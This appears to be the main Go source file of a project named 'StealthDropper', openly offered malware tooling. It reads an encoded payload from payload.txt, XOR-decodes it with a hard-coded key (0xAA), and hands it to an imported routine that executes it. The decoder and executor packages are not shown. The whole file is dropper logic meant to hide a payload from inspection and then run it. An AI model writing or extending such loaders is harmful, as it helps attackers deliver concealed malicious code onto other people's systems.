package main

import	"fmt"
import	"os"
import	"github.com/Cyber-30/StealthDropper/decoder"
import	"github.com/Cyber-30/StealthDropper/exec"


func decode(data []byte) []byte {
	key := byte(0xAA)
	return decoder.XOR(data, key)
}

func main() {
	payload, err := os.ReadFile("payload.txt")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}
	decoded := decode(payload)
	exec.ExecutePayload(decoded)
}
